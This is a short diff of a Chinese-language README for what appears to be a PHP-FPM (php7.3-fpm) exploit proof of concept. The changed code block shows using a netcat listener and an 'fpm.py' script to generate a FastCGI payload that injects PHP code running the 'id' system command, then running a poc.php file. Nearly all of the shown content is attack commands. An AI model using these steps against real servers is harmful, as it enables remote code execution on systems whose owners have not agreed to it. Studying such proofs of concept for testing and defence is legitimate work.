@@ -10,12 +10,12 @@
 
 测试 php7.3-fpm
 
-`clone`到`/tmp`下，生成payload
-
 ```
+echo "<?php echo 1; ?>" > /tmp/poc.php
+
 nc -lvp 6666 > payload.txt
 
-python fpm.py -c '<?php echo `id`; exit;?>' -p 6666 127.0.0.1 `pwd`/poc.php
+python fpm.py -c '<?php echo `id`; exit;?>' -p 6666 127.0.0.1 /tmp/poc.php
 ```
 
 运行`poc.php`
